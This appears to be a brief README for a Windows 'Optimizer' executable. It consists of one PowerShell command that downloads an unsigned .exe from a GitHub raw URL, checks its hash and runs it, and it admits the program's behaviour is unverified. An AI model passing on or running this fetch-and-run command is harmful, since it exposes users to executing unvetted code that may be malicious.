# Optimizer

Windows executable distribution.

## Download and run

```powershell
& { $ErrorActionPreference='Stop'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $p=Join-Path $env:TEMP ('optimizer-'+[guid]::NewGuid()+'.exe'); Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/maximokx1-debug/optimizer/9df7b5db2dfb1d0149921c3b1d855b4a3bc48124/optimizer.exe' -OutFile $p; if ((Get-FileHash -LiteralPath $p -Algorithm SHA256).Hash -ne '2750459C5F5592D469B4325DADAB657E133FF4BCC784EAECD5AE21CF81C927C1') { Remove-Item -LiteralPath $p; throw 'SHA256 mismatch' }; Start-Process -FilePath $p }
```

No token or input is required by this command. Windows may show its normal security or administrator prompts. The executable is unsigned; its behavior and antivirus results have not been verified.
